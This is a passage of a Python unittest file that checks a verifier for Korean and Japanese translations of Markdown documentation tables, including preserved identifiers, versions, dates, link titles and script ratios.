        translated = """| 기능 | 설명 |
| --- | --- |
| Lock | Prevent writes |
| 캐시 | 값을 저장함 |
"""

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_an_unchanged_product_only_table(self):
        """제품명만 포함해 원문을 보존한 표를 허용."""

        source = """| Driver | Backend |
| --- | --- |
| Redis | DynamoDB |
| Memcached | AWS |
"""
        translated = """| 드라이버 | 백엔드 |
| --- | --- |
| Redis | DynamoDB |
| Memcached | AWS |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_translated_table_with_an_escaped_pipe_in_code(self):
        """code 안에서 escape된 pipe를 보존한 표 번역을 허용."""

        source = """| Method | Description |
| --- | --- |
| `->days(array\\|mixed);` | Limit the task to specific days. |
"""
        translated = """| 메서드 | 설명 |
| --- | --- |
| `->days(array\\|mixed);` | 작업을 특정 요일로 제한합니다. |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_kanji_only_japanese_table_headers(self):
        """한자만 포함한 일본어 표 header를 허용."""

        source = """| Method | Description |
| --- | --- |
| `foo` | Run task. |
"""
        translated = """| 方法 | 説明 |
| --- | --- |
| `foo` | タスクを実行します。 |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_preserved_product_and_version_cells_in_table_rows(self):
        """표 행의 제품명과 버전 데이터 원문 보존을 허용."""

        source = """| Package | Versions Supported |
| --- | --- |
| Livewire | core, 2.x - 3.x |
| Folio | 1.x |
"""
        translated = """| 패키지 | 지원 버전 |
| --- | --- |
| Livewire | core, 2.x - 3.x |
| Folio | 1.x |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_preserved_facade_identifier_in_a_table_row(self):
        """표 행의 facade 식별자 원문 보존을 허용."""

        source = """| Facade | Class |
| --- | --- |
| App | `Illuminate\\Support\\Facades\\App` |
"""
        translated = """| 파사드 | 클래스 |
| --- | --- |
| App | `Illuminate\\Support\\Facades\\App` |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_translates_table_prose_while_preserving_a_2fa_identifier(self):
        """2FA 식별자를 보존하면서 표 산문을 번역."""

        source = """| Action | Description |
| --- | --- |
| Display 2FA challenge form | Show the authentication challenge. |
"""
        translated = """| 작업 | 설명 |
| --- | --- |
| 2FA 챌린지 양식 표시 | 인증 챌린지를 표시합니다. |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(source, source, locale="ko"),
        )

    def test_accepts_preserved_version_editions_and_channel_lists(self):
        """버전 edition·channel 목록의 원문 보존을 허용."""

        source = """| Package | Versions Supported |
| --- | --- |
| Boost | 2.x Free, 2.x Pro |
| Pennant | core, free, pro |
"""
        translated = """| 패키지 | 지원 버전 |
| --- | --- |
| Boost | 2.x Free, 2.x Pro |
| Pennant | core, free, pro |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_localized_japanese_punctuation_between_version_tokens(self):
        """버전 token 사이의 일본어 문장 부호 현지화를 허용."""

        source = """| Package | Versions Supported |
| --- | --- |
| Laravel Framework | core, 10.x, 11.x |
"""
        translated = """| パッケージ | サポートバージョン |
| --- | --- |
| Laravel Framework | core、10.x、11.x |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_preserved_release_dates(self):
        """release date 데이터의 원문 보존을 허용."""

        source = """| Version | Release Date |
| --- | --- |
| 13 | March 17th, 2026 |
"""
        translated = """| 버전 | 릴리스 날짜 |
| --- | --- |
| 13 | March 17th, 2026 |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_localized_japanese_release_date(self):
        """일본어로 현지화한 release date 산문을 허용."""

        source = """| Version | Release Date | PHP (*) |
| --- | --- | --- |
| 13 | March 17th, 2026 | 8.3 - 8.5 |
"""
        translated = """| バージョン | リリース日 | PHP(*) |
| --- | --- | --- |
| 13 | 2026年3月17日 | 8.3 - 8.5 |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_identifier_only_mapping_rows(self):
        """식별자 mapping만 포함한 표 행을 허용."""

        source = """| Action | Policy Method |
| --- | --- |
| index | viewAny |
| show | view |
"""
        translated = """| 작업 | 정책 메서드 |
| --- | --- |
| index | viewAny |
| show | view |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_preserved_skill_identifiers(self):
        """skill 식별자의 원문 보존을 허용."""

        source = """| Skill | Package |
| --- | --- |
| fluxui-development | Flux UI |
| inertia-react-development | Inertia |
"""
        translated = """| スキル | パッケージ |
| --- | --- |
| fluxui-development | Flux UI |
| inertia-react-development | Inertia |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_translates_comma_separated_prose_in_a_skills_column(self):
        """skills 열의 쉼표 구분 산문을 번역."""

        source = """| Skills | Description |
| --- | --- |
| Focused, task-specific | Best for a narrow task. |
"""
        translated = """| スキル | 説明 |
| --- | --- |
| 焦点を絞った、特定のタスク向け | 限定的なタスクに最適です。 |
"""
        translated = self._with_table_owner_annotation(source, translated)
        english_value = translated.replace(
            "焦点を絞った、特定のタスク向け",
            "Focused, task-specific",
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )
        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(english_value, source, locale="ja"),
        )

    def test_accepts_preserved_type_and_configuration_values(self):
        """type과 설정값 데이터의 원문 보존을 허용."""

        source = """| Type | Default | Description |
| --- | --- | --- |
| boolean | (bool) true | Enable the server. |
| string | (string) '' | Set the prefix. |
"""
        translated = """| 타입 | 기본값 | 설명 |
| --- | --- | --- |
| boolean | (bool) true | 서버를 활성화합니다. |
| string | (string) '' | 접두사를 설정합니다. |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_localized_japanese_type_values(self):
        """일본어 문장 안에 보존된 type 값을 허용."""

        source = """| Type | Description |
| --- | --- |
| boolean | Flag value. |
| string | Text value. |
"""
        translated = """| 型 | 説明 |
| --- | --- |
| ブール値 | フラグ値です。 |
| 文字列 | テキスト値です。 |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_parenthesized_env_literals(self):
        """괄호로 감싼 환경 설정 literal의 보존을 허용."""

        source = """| .env Value | Configuration Value |
| --- | --- |
| (true) | true |
| (empty) | '' |
"""
        translated = """| .env 값 | 구성 값 |
| --- | --- |
| (true) | true |
| (empty) | '' |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_an_html_entity_only_table_cell(self):
        """HTML entity만 포함한 표 cell을 허용."""

        source = """| Facade | Binding |
| --- | --- |
| Auth | &nbsp; |
"""
        translated = """| 파사드 | 바인딩 |
| --- | --- |
| Auth | &nbsp; |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_long_product_list_in_a_providers_column(self):
        """provider 열의 긴 제품명 목록 원문 보존을 허용."""

        source = """| Providers | Notes |
| --- | --- |
| OpenAI, OpenAI Compatible, Anthropic, Gemini, Groq | Supported providers. |
"""
        translated = """| プロバイダー | 備考 |
| --- | --- |
| OpenAI、OpenAI Compatible、Anthropic、Gemini、Groq | 対応プロバイダーです。 |
"""
        translated = self._with_table_owner_annotation(source, translated)

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_allows_short_unchanged_title_case_table_values(self):
        """짧은 Title Case 표 값의 원문 보존을 허용."""

        source = """| Action | Status |
| --- | --- |
| Delete | Deprecated |
"""
        translated = """| 작업 | 상태 |
| --- | --- |
| Delete | Deprecated |
"""

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_allows_short_unchanged_title_case_table_phrase(self):
        """짧은 Title Case 표 문구의 원문 보존을 허용."""

        source = """| Feature | Description |
| --- | --- |
| Lock | Prevent Writes |
"""
        translated = """| 기능 | 설명 |
| --- | --- |
| Lock | Prevent Writes |
"""

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_does_not_apply_target_script_minimum_below_forty_letters(self):
        """원문 Letter 40자 미만에는 대상 문자 최소치 제외."""

        source = "Acquire the cache lock.\n"
        cases = (
            ("ko", "キャッシュロックを取得します。"),
            ("ja", "캐시 잠금을 획득합니다."),
        )

        for locale, body in cases:
            with self.subTest(locale=locale):
                translated = (
                    "<!-- Acquire the cache lock. -->\n"
                    f"{body}\n"
                )

                self.assertNotIn(
                    "provider target language mismatch",
                    response_contract.verify(translated, source, locale=locale),
                )


class EchoedHeaderCellsTests(unittest.TestCase):
    """번역되지 않은 표 머리글 셀 지목 검증."""

    SOURCE = "| Modifier | Description |\n| --- | --- |\n| `->a()` | Does a thing. |\n"

    def test_names_untranslated_header_cell(self):
        """원문 그대로 돌아온 머리글 셀만 반환."""

        translated = "| Modifier | 説明 |\n| --- | --- |\n| `->a()` | 何かをします。 |\n"

        self.assertEqual(
            response_contract.echoed_header_cells(translated, self.SOURCE),
            ["Modifier"],
        )

    def test_returns_empty_when_header_is_translated(self):
        """머리글이 모두 번역되면 빈 목록."""

        translated = "| 修飾子 | 説明 |\n| --- | --- |\n| `->a()` | 何かをします。 |\n"

        self.assertEqual(
            response_contract.echoed_header_cells(translated, self.SOURCE),
            [],
        )


class DataCellProseTests(unittest.TestCase):
    """표 data cell의 보호 데이터·설명 문구 구분 검증."""

    def test_treats_separated_single_token_items_as_data(self):
        """구분자로 나뉜 단일 토큰 나열은 보호 데이터."""

        self.assertTrue(
            response_contract._cell_has_no_translatable_prose(
                "OpenAI, Gemini, Azure, Bedrock"
            )
        )

    def test_treats_descriptive_phrase_as_prose(self):
        """설명 문구는 대문자로 시작해도 보호 데이터가 아님."""

        for text in (
            "Configures Distributed Cache",
            "The iterations remaining in the loop.",
            "Read the database schema",
        ):
            with self.subTest(text=text):
                self.assertFalse(
                    response_contract._cell_has_no_translatable_prose(text)
                )


class LinkTitleSignatureTests(unittest.TestCase):
    """링크 title 서명의 재정렬 허용과 교환 거부 검증."""

    SOURCE = 'See [alpha](https://a "A") and [beta](https://a "B").\n'

    def _verify(self, body):
        return response_contract.verify(
            f"<!-- {self.SOURCE.strip()} -->\n{body}", self.SOURCE, locale="ja"
        )

    def test_allows_reordered_links(self):
        """어순에 따른 링크 재배열은 허용."""

        body = 'まず [beta](https://a "B")、次に [alpha](https://a "A") です。\n'

        self.assertNotIn("provider link title mismatch", self._verify(body))

    def test_rejects_swapped_titles_on_the_same_target(self):
        """같은 target을 쓰는 링크 사이의 title 교환은 거부."""

        body = 'まず [alpha](https://a "B")、次に [beta](https://a "A") です。\n'

        self.assertIn("provider link title mismatch", self._verify(body))


class TargetScriptRatioTests(unittest.TestCase):
    """문서 단위 목표 문자 비율 계산 검증."""

    def test_fully_translated_text_reaches_one(self):
        """완전히 번역된 산문은 비율 1에 도달."""

        self.assertEqual(
            response_contract.target_script_ratio("결과를 캐시합니다", "ko"), 1.0
        )

    def test_other_locale_text_scores_zero(self):
        """다른 로케일 문자만 있으면 비율 0."""

        self.assertEqual(
            response_contract.target_script_ratio("결과를 캐시합니다", "ja"), 0.0
        )


    def test_accepts_an_unannotated_table_without_outer_pipes(self):
        """표 전용 응답은 바깥쪽 pipe가 없어도 annotation 생략을 허용."""
        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "기능 | 설명\n"
            "------- | -------\n"
            "잠금 | 쓰기 방지\n"
        )
        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )


if __name__ == "__main__":
    unittest.main()
